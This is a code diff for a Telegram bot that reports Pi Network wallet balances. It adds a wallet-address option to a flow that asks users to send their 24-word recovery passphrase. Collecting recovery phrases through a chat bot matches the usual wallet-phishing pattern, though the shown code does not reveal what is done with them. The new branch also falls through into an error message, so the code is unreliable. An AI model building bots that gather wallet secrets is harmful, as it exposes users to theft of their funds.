@@ -29,7 +29,7 @@ const userSessions = {};
 
 bot.onText(/\/balance/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space)');
+    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');
 
     userSessions[chatId] = { waitingForPassphraseForBalance: true }
 });
@@ -99,6 +99,18 @@ bot.on('message', async (msg) => {
         const passphrase = msg.text.trim().toLocaleLowerCase();
 
         const words = passphrase.split(/\s+/);
+
+        if(words.length === 1) {
+            bot.sendMessage(chatId, '⏳ Checking validity of the address');
+            const accountData = await getAccountWithoutProxy(passphrase);
+            if(!accountData.balances) {
+                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
+            } else {
+                const balanceString = getBalance(accountData);
+                const balance = parseFloat(balanceString) - 0.98;
+                bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
+            }
+        }
         if(words.length !== 24) {
             return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
         }
